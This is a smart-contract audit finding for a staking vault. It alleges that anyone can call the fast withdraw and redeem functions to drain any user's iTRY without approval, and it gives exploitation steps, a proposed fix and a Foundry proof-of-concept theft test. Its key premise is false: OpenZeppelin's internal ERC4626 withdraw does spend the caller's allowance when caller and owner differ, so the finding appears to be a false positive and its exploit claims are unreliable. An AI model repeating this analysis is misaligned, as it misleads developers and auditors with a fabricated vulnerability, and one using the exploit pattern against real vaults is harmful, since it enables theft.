## Title
Missing Allowance Validation in Fast Redemption Functions Allows Unauthorized Theft of User Assets

## Summary
The `fastWithdraw` and `fastRedeem` functions in `StakediTryFastRedeem.sol` fail to validate that the caller has approval from the owner before burning the owner's shares and transferring assets. This allows any attacker to steal iTRY assets from any user by calling these functions without authorization, bypassing the standard ERC4626 allowance mechanism.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/token/wiTRY/StakediTryFastRedeem.sol` (functions `fastWithdraw` lines 76-90 and `fastRedeem` lines 57-71)

**Intended Logic:** According to the ERC4626 standard and the interface documentation, when a caller wants to redeem/withdraw on behalf of another owner, they must have sufficient allowance from that owner. [1](#0-0) 

**Actual Logic:** The `fastWithdraw` function only checks if the requested assets exceed the owner's maximum withdrawable amount but never validates the caller's allowance. [2](#0-1) 

Similarly, the `fastRedeem` function only checks the owner's share balance without validating allowances. [3](#0-2) 

The vulnerability occurs because these functions call `_redeemWithFee` which directly invokes the internal `_withdraw` function. [4](#0-3) 

The internal `_withdraw` function in the parent contracts eventually calls OpenZeppelin's ERC4626 `_withdraw`, which does NOT check allowances. [5](#0-4) 

In standard ERC4626, allowance checks occur in the PUBLIC `withdraw` and `redeem` functions before calling the internal `_withdraw`. However, `fastWithdraw` and `fastRedeem` bypass the public functions and directly call internal functions, missing this critical security check.

**Exploitation Path:**
1. Victim (user1) deposits 1000 iTRY tokens into StakediTry vault, receiving wiTRY shares
2. Attacker observes victim's balance via `balanceOf(victim)` or `maxWithdraw(victim)`
3. Attacker calls `fastWithdraw(victim_max_assets, attacker_address, victim_address)` without having any approval from victim
4. The function checks `maxWithdraw(victim)` which passes since victim has funds
5. `_redeemWithFee` is called, which burns victim's shares and transfers iTRY to attacker (minus fee to treasury)
6. Victim's wiTRY shares are completely drained, and attacker receives the underlying iTRY tokens

**Security Property Broken:** This violates the fundamental ERC4626 security property that shares can only be redeemed by the owner or an approved operator. It also enables direct theft of user funds without authorization, which is a critical protocol invariant violation.

## Impact Explanation
- **Affected Assets**: All wiTRY shares (staked iTRY) held by any user in the StakediTry vault are at risk of theft
- **Damage Severity**: Attacker can steal 100% of any user's staked iTRY balance (minus the fast redemption fee which goes to treasury). For a victim with X iTRY staked, attacker receives approximately X * (1 - fee_percentage) iTRY tokens
- **User Impact**: ALL users who have deposited iTRY into the StakediTry vault are vulnerable. Any transaction where a user has staked funds can be exploited by any external attacker in a single transaction

## Likelihood Explanation
- **Attacker Profile**: Any external address (EOA or contract) can exploit this vulnerability. No special privileges or roles required
- **Preconditions**: 
  - Fast redeem must be enabled (`fastRedeemEnabled = true`)
  - Cooldown must be active (`cooldownDuration > 0`)
  - Victim must have wiTRY shares in their balance
  - Vault must have sufficient iTRY liquidity for the redemption
- **Execution Complexity**: Single transaction attack. Attacker simply calls `fastWithdraw` or `fastRedeem` with victim's address as the owner parameter
- **Frequency**: Can be exploited continuously against any number of victims. Each victim can be drained once, but the attacker can target all vault users sequentially or in parallel

## Recommendation

Add allowance validation before executing the fast redemption. The fix should mirror the standard ERC4626 pattern:

```solidity
// In src/token/wiTRY/StakediTryFastRedeem.sol

// For fastRedeem function (line 57-71):
function fastRedeem(uint256 shares, address receiver, address owner)
    external
    ensureCooldownOn
    ensureFastRedeemEnabled
    returns (uint256 assets)
{
    if (shares > maxRedeem(owner)) revert ExcessiveRedeemAmount();
    
    // FIX: Add allowance check and spending when caller != owner
    if (msg.sender != owner) {
        _spendAllowance(owner, msg.sender, shares);
    }

    uint256 totalAssets = previewRedeem(shares);
    uint256 feeAssets = _redeemWithFee(shares, totalAssets, receiver, owner);

    emit FastRedeemed(owner, receiver, shares, totalAssets, feeAssets);

    return totalAssets - feeAssets;
}

// For fastWithdraw function (line 76-90):
function fastWithdraw(uint256 assets, address receiver, address owner)
    external
    ensureCooldownOn
    ensureFastRedeemEnabled
    returns (uint256 shares)
{
    if (assets > maxWithdraw(owner)) revert ExcessiveWithdrawAmount();

    uint256 totalShares = previewWithdraw(assets);
    
    // FIX: Add allowance check and spending when caller != owner
    if (msg.sender != owner) {
        _spendAllowance(owner, msg.sender, totalShares);
    }
    
    uint256 feeAssets = _redeemWithFee(totalShares, assets, receiver, owner);

    emit FastRedeemed(owner, receiver, totalShares, assets, feeAssets);

    return totalShares;
}
```

This follows the exact pattern used in OpenZeppelin's ERC4626 `withdraw` and `redeem` functions, ensuring that when `msg.sender != owner`, the caller must have sufficient allowance and that allowance is properly spent.

## Proof of Concept

```solidity
// File: test/Exploit_FastRedeemUnauthorizedTheft.t.sol
// Run with: forge test --match-test test_UnauthorizedFastWithdrawTheft -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/token/wiTRY/StakediTryFastRedeem.sol";
import {IStakediTry} from "../src/token/wiTRY/interfaces/IStakediTry.sol";
import "./mocks/MockERC20.sol";

contract ExploitFastRedeemUnauthorizedTheft is Test {
    StakediTryFastRedeem public stakediTry;
    MockERC20 public iTryToken;
    
    address public admin;
    address public treasury;
    address public rewarder;
    address public victim;
    address public attacker;
    
    uint16 public constant DEFAULT_FEE = 500; // 5%
    
    function setUp() public {
        admin = makeAddr("admin");
        treasury = makeAddr("treasury");
        rewarder = makeAddr("rewarder");
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");
        
        // Deploy iTRY token
        iTryToken = new MockERC20("iTRY", "iTRY");
        
        // Deploy StakediTryFastRedeem
        vm.prank(admin);
        stakediTry = new StakediTryFastRedeem(
            IERC20(address(iTryToken)), 
            rewarder, 
            admin, 
            treasury
        );
        
        // Enable fast redeem
        vm.startPrank(admin);
        stakediTry.setFastRedeemEnabled(true);
        stakediTry.setFastRedeemFee(DEFAULT_FEE);
        vm.stopPrank();
        
        // Mint tokens to victim and approve vault
        iTryToken.mint(victim, 1000e18);
        vm.prank(victim);
        iTryToken.approve(address(stakediTry), type(uint256).max);
        
        // Victim deposits to vault
        vm.prank(victim);
        stakediTry.deposit(1000e18, victim);
    }
    
    function test_UnauthorizedFastWithdrawTheft() public {
        // SETUP: Verify initial state
        uint256 victimShares = stakediTry.balanceOf(victim);
        uint256 victimMaxWithdraw = stakediTry.maxWithdraw(victim);
        uint256 attackerBalanceBefore = iTryToken.balanceOf(attacker);
        
        assertGt(victimShares, 0, "Victim should have shares");
        assertGt(victimMaxWithdraw, 0, "Victim should have withdrawable assets");
        assertEq(attackerBalanceBefore, 0, "Attacker starts with no iTRY");
        
        // EXPLOIT: Attacker calls fastWithdraw for victim WITHOUT APPROVAL
        vm.prank(attacker);
        uint256 sharesBurned = stakediTry.fastWithdraw(
            victimMaxWithdraw,  // Drain victim's full balance
            attacker,           // Send assets to attacker
            victim              // Burn victim's shares
        );
        
        // VERIFY: Confirm exploit success
        uint256 attackerBalanceAfter = iTryToken.balanceOf(attacker);
        uint256 victimSharesAfter = stakediTry.balanceOf(victim);
        
        assertEq(victimSharesAfter, 0, "Victim's shares completely drained");
        assertGt(sharesBurned, 0, "Shares were burned from victim");
        assertGt(attackerBalanceAfter, 0, "Attacker received stolen iTRY");
        
        // Calculate expected net amount (gross - 5% fee)
        uint256 expectedNet = victimMaxWithdraw - (victimMaxWithdraw * DEFAULT_FEE / 10000);
        assertEq(
            attackerBalanceAfter, 
            expectedNet, 
            "Attacker received net iTRY (after fee to treasury)"
        );
        
        console.log("=== EXPLOIT SUCCESSFUL ===");
        console.log("Victim's shares drained:", victimShares);
        console.log("Attacker received iTRY:", attackerBalanceAfter);
        console.log("Treasury fee:", victimMaxWithdraw - expectedNet);
    }
    
    function test_UnauthorizedFastRedeemTheft() public {
        // SETUP: Verify initial state
        uint256 victimShares = stakediTry.balanceOf(victim);
        uint256 attackerBalanceBefore = iTryToken.balanceOf(attacker);
        
        assertGt(victimShares, 0, "Victim should have shares");
        assertEq(attackerBalanceBefore, 0, "Attacker starts with no iTRY");
        
        // EXPLOIT: Attacker calls fastRedeem for victim WITHOUT APPROVAL
        vm.prank(attacker);
        uint256 assetsReceived = stakediTry.fastRedeem(
            victimShares,  // Redeem all victim's shares
            attacker,      // Send assets to attacker
            victim         // Burn victim's shares
        );
        
        // VERIFY: Confirm exploit success
        uint256 attackerBalanceAfter = iTryToken.balanceOf(attacker);
        uint256 victimSharesAfter = stakediTry.balanceOf(victim);
        
        assertEq(victimSharesAfter, 0, "Victim's shares completely drained");
        assertGt(assetsReceived, 0, "Assets were stolen by attacker");
        assertEq(attackerBalanceAfter, assetsReceived, "Attacker received stolen iTRY");
        
        console.log("=== EXPLOIT SUCCESSFUL ===");
        console.log("Victim's shares stolen:", victimShares);
        console.log("Attacker received iTRY:", attackerBalanceAfter);
    }
}
```

## Notes

The test demonstrating the allowance-based fast redeem at line 379-403 of the test file creates a false sense of security - it shows that fast redeem WORKS with approval, but critically, there is NO test showing that it FAILS without approval. [6](#0-5) 

This vulnerability affects both `fastRedeem` and `fastWithdraw` functions identically, as they both follow the same pattern of accepting an owner parameter and calling `_redeemWithFee` without allowance validation.

The same vulnerability pattern does NOT affect the composer-restricted functions (`fastRedeemThroughComposer` and `fastWithdrawThroughComposer`) since those require the COMPOSER_ROLE and are intended for cross-chain operations with different security assumptions.

### Citations

**File:** src/token/wiTRY/interfaces/IStakediTryFastRedeem.sol (L32-48)
```text
    /**
     * @notice Fast redeem shares for immediate withdrawal with a fee
     * @param shares Amount of shares to redeem
     * @param receiver Address to receive the net assets
     * @param owner Address that owns the shares being redeemed
     * @return assets Net assets received by the receiver (after fee)
     */
    function fastRedeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);

    /**
     * @notice Fast withdraw assets for immediate withdrawal with a fee
     * @param assets Amount of assets to withdraw (gross, before fee)
     * @param receiver Address to receive the net assets
     * @param owner Address that owns the shares being burned
     * @return shares Total shares burned
     */
    function fastWithdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
```

**File:** src/token/wiTRY/StakediTryFastRedeem.sol (L57-71)
```text
    function fastRedeem(uint256 shares, address receiver, address owner)
        external
        ensureCooldownOn
        ensureFastRedeemEnabled
        returns (uint256 assets)
    {
        if (shares > maxRedeem(owner)) revert ExcessiveRedeemAmount();

        uint256 totalAssets = previewRedeem(shares);
        uint256 feeAssets = _redeemWithFee(shares, totalAssets, receiver, owner);

        emit FastRedeemed(owner, receiver, shares, totalAssets, feeAssets);

        return totalAssets - feeAssets;
    }
```

**File:** src/token/wiTRY/StakediTryFastRedeem.sol (L76-90)
```text
    function fastWithdraw(uint256 assets, address receiver, address owner)
        external
        ensureCooldownOn
        ensureFastRedeemEnabled
        returns (uint256 shares)
    {
        if (assets > maxWithdraw(owner)) revert ExcessiveWithdrawAmount();

        uint256 totalShares = previewWithdraw(assets);
        uint256 feeAssets = _redeemWithFee(totalShares, assets, receiver, owner);

        emit FastRedeemed(owner, receiver, totalShares, assets, feeAssets);

        return totalShares;
    }
```

**File:** src/token/wiTRY/StakediTryFastRedeem.sol (L138-156)
```text
    function _redeemWithFee(uint256 shares, uint256 assets, address receiver, address owner)
        internal
        returns (uint256 feeAssets)
    {
        feeAssets = (assets * fastRedeemFeeInBPS) / BASIS_POINTS;

        // Enforce that fast redemption always has a cost
        if (feeAssets == 0) revert InvalidAmount();

        uint256 feeShares = previewWithdraw(feeAssets);
        uint256 netShares = shares - feeShares;
        uint256 netAssets = assets - feeAssets;

        // Withdraw fee portion to treasury
        _withdraw(_msgSender(), fastRedeemTreasury, owner, feeAssets, feeShares);

        // Withdraw net portion to receiver
        _withdraw(_msgSender(), receiver, owner, netAssets, netShares);
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L262-278)
```text
    function _withdraw(address caller, address receiver, address _owner, uint256 assets, uint256 shares)
        internal
        override
        nonReentrant
        notZero(assets)
        notZero(shares)
    {
        if (
            hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)
                || hasRole(FULL_RESTRICTED_STAKER_ROLE, _owner)
        ) {
            revert OperationNotAllowed();
        }

        super._withdraw(caller, receiver, _owner, assets, shares);
        _checkMinShares();
    }
```

**File:** test/StakediTryV2.fastRedeem.t.sol (L378-403)
```text
    /// @notice Tests fast redeem with allowance (owner != caller)
    function test_fastRedeem_withAllowance() public {
        // Setup
        vm.startPrank(admin);
        stakediTry.setFastRedeemEnabled(true);
        stakediTry.setFastRedeemFee(DEFAULT_FEE);
        vm.stopPrank();

        // User1 deposits
        vm.prank(user1);
        uint256 shares = stakediTry.deposit(1000e18, user1);

        // User1 approves user2
        vm.prank(user1);
        stakediTry.approve(user2, shares);

        uint256 expectedAssets = stakediTry.previewRedeem(shares);
        uint256 expectedNet = expectedAssets - (expectedAssets * DEFAULT_FEE) / 10000;

        // User2 redeems on behalf of user1
        vm.prank(user2);
        uint256 netAssets = stakediTry.fastRedeem(shares, user2, user1);

        assertEq(netAssets, expectedNet, "Should work with allowance");
        assertEq(stakediTry.balanceOf(user1), 0, "Owner shares should be burned");
    }
```
